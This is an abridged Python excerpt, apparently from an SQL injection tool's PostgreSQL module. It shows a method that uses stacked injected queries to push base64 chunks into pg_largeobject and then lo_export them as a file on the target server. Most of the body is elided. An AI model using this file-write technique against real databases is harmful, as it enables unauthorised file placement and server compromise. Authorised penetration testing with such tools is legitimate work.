...
class Filesystem(GenericFilesystem):
    ...
    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        ...
        for offset in xrange(0, localFileSize, LOBLKSIZE):
            ...
            inject.goStacked(
                "INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s),"
                " 'base64'))" % (self.oid, self.page, self.tblField, self.fileTblName)
            )
        ...
        inject.goStacked(
            "SELECT lo_export(%d, '%s')" % (self.oid, remoteFile), silent=True
        )
